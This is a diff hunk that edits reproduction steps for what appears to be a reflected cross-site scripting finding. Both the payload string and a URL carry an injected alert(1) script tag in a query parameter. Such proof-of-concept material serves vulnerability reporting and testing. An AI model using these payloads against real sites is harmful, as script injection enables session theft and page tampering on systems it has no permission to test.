@@ -30,7 +30,7 @@ data-query='tix5uni'">'
 ```
 tix5uni'><script>alert(1)</script>
 ```
-6. Submit this as the search term or visit the following URL directly:
+6. visit the following URL directly:
 ```
 http://kzlabs.com/56.php?p='><script>alert(1)</script>
 ```
